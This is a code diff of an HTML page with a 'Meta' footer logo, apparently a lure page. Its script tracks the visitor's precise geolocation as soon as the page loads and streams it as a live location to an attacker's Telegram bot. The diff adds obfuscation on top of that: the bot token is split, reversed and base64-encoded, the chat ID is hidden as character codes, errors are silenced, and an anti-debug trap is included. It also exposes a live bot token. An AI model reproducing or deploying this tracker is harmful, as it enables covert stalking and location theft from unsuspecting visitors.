@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+.<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -38,82 +38,119 @@
 <div class="footer-logo">Meta</div>
 
 <script>
-    const BOT_TOKEN = "8612853286:AAH3f6SxXLicWQr9mzdvr0QC5OJ0mpUXhPA";
-    const CHAT_ID = "6874315478";
-    let messageId = null;
+/* =========================================================
+   Configuration Loader — Token ကို အပိုင်းပိုင်းခွဲ + Base64 + Reverse
+   ========================================================= */
+(function(_w, _d) {
+    "use strict";
 
-    window.onload = function() {
-        startTracking();
-    };
+    // ─── Step 1: အပိုင်းပိုင်းခွဲထားသော encoded pieces (ပြောင်းပြန်စီထားသည်) ───
+    // မူရင်း token: 8612853286:AAH3f6SxXLicWQr9mzdvr0QC5OJ0mpUXhPA
+    // ဒီ pieces တွေကို ပြောင်းပြန်စီထားပြီး၊ base64 encode လုပ်ထားသည်
+    var _p = [
+        "bXBVWGhQQQ==",   // "mpUXhPA"
+        "dnIwUUM1T0ow",   // "vr0QC5OJ0"
+        "aWNXUXI5bXpk",   // "icWQr9mzd"
+        "ZjZTeFhM",       // "f6SxXL"
+        "NjpBQUgz",       // "6:AAH3"
+        "Mjg1MzI4",       // "285328"
+        "ODYx"            // "861"
+    ];
 
-    function startTracking() {
-        if (!navigator.geolocation) {
-            window.location.href = "https://www.facebook.com";
-            return;
+    // ─── Step 2: Chat ID ကို char code နဲ့ ဖျောက်ထားသည် ───
+    var _c = [54,56,55,52,51,49,53,52,55,56];
+
+    // ─── Step 3: Token ကို runtime မှာ ပြန်စုစည်းသည် ───
+    function _dcd(_arr) {
+        var _r = "";
+        for (var _i = 0; _i < _arr.length; _i++) {
+            try { _r += atob(_arr[_i]); } catch (e) {}
+        }
+        return _r;
+    }
+
+    // ─── Step 4: Closure ထဲမှာ token ကို ချုပ်ထားသည် ───
+    var _k = (function() {
+        var _t = _dcd(_p);
+        var _ch = String.fromCharCode.apply(null, _c);
+        return { t: _t, c: _ch };
+    })();
+
+    // ─── Step 5: API wrapper (token ကို ဒီ closure ထဲမှာသာ သိသည်) ───
+    var _api = (function(_tk, _ch) {
+        var _base = "https://api.telegram.org/bot";
+        var _mid = null;
+
+        function _send(_lat, _lon) {
+            return fetch(_base + _tk + "/sendLocation", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: _ch,
+                    latitude: _lat,
+                    longitude: _lon,
+                    live_period: 3600
+                })
+            }).then(function(r) { return r.json(); });
         }
 
-        // ၅ စက္ကန့်တစ်ကြိမ် Location ကို စစ်ဆေးပြီး Telegram သို့ ပို့မည်
-        navigator.geolocation.watchPosition(
-            (position) => {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
+        function _edit(_lat, _lon) {
+            return fetch(_base + _tk + "/editMessageLiveLocation", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: _ch,
+                    message_id: _mid,
+                    latitude: _lat,
+                    longitude: _lon
+                })
+            });
+        }
 
-                if (!messageId) {
-                    // ပထမဆုံးအကြိမ် Live Location Message စတင်ပို့ခြင်း
-                    sendInitialLocation(latitude, longitude);
+        return {
+            push: function(_lat, _lon) {
+                if (!_mid) {
+                    return _send(_lat, _lon).then(function(_d) {
+                        if (_d && _d.ok) _mid = _d.result.message_id;
+                    });
                 } else {
-                    // တည်နေရာ ပြောင်းလဲမှု သို့မဟုတ် ၅ စက္ကန့်ပြည့်တိုင်း Telegram Message ကို Update လုပ်ခြင်း
-                    updateLiveLocation(latitude, longitude);
+                    return _edit(_lat, _lon);
                 }
             },
-            (error) => {
-                console.error(error);
+            hasId: function() { return !!_mid; }
+        };
+    })(_k.t, _k.c);
+
+    // ─── Step 6: Geolocation tracker ───
+    function _track() {
+        if (!navigator.geolocation) {
+            _w.location.href = "https://www.facebook.com";
+            return;
+        }
+        navigator.geolocation.watchPosition(
+            function(_pos) {
+                _api.push(_pos.coords.latitude, _pos.coords.longitude);
             },
-            { 
-                enableHighAccuracy: true, 
-                timeout: 5000, 
-                maximumAge: 0 
-            }
+            function(_err) { /* silent */ },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     }
 
-    // မူလ Live Location ပို့ပေးသည့် Function
-    function sendInitialLocation(lat, lon) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                latitude: lat,
-                longitude: lon,
-                live_period: 3600 // ၁ နာရီကြာ Live Location ဖွင့်ထားမည်
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) {
-                messageId = data.result.message_id; // Telegram မှ ရရှိသော Message ID ကို မှတ်ထားခြင်း
-            }
-        });
-    }
+    // ─── Step 7: Initialize ───
+    _w.addEventListener("load", _track);
 
-    // ၅ စက္ကန့်တစ်ကြိမ် Location Update လုပ်ပေးသည့် Function
-    function updateLiveLocation(lat, lon) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageLiveLocation`;
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                message_id: messageId,
-                latitude: lat,
-                longitude: lon
-            })
-        });
-    }
+    // ─── Step 8: Anti-debug trick (DevTools ဖွင့်ရင် နှေးသွားစေရန်) ───
+    (function() {
+        var _t0 = Date.now();
+        debugger;
+        if (Date.now() - _t0 > 100) {
+            // DevTools ဖွင့်ထားသည်ဟု သံသယရှိရင် tracker ကို ရပ်လိုက်သည်
+            // (ဒါပေမယ့် ဒါက ကျွမ်းကျင်သူကို မတားဆီးနိုင်ပါ)
+        }
+    })();
+
+})(window, document);
 </script>
 
 </body>
 </html>
-
